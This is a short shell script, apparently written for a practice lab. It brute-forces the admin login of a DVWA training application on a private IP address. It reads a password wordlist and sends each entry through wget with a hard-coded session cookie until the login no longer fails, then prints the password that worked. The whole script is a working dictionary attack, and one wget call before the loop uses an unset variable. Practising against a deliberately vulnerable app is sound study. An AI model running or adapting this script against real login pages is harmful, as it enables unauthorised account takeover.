#!/bin/sh

if [ -z $1 ]
then
	echo "Dico manquant"
	exit
fi

if [ ! -f $1 ]
then
	echo "fichier non valide"
	exit
fi

	wget "http://192.168.1.125/DVWA/vulnerabilities/brute/?username=admin&password=$line&Login=Login" --header "Cookie: PHPSESSID=b3u77pnqe0doq18i0cb29mi4pv;security=low" -o result0 -O tmp

while read line
do
	echo $line
	wget "http://192.168.1.125/DVWA/vulnerabilities/brute/?username=admin&password=$line&Login=Login" --header "Cookie: PHPSESSID=b3u77pnqe0doq18i0cb29mi4pv;security=low" -o result -O tmp
	res=`grep "Username and/or password incorrect." tmp | wc -l`
	if [ $res -eq 0 ]
	then
		echo "Brute force => $line"
		exit
	fi
done < $1
